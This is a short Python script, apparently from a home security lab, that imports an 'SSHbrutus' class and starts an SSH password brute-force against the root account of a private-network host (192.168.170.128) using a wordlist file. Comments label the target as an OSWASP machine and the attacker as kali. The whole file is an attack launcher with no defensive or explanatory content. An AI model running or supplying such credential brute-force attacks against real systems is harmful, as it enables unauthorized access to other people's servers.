from ssh_bruter import SSHbrutus
# 192...128 is `OSWASP`
# 192...151 is `kali`
s = SSHbrutus('192.168.170.128', 'root', 'passwd.txt')
s.start()
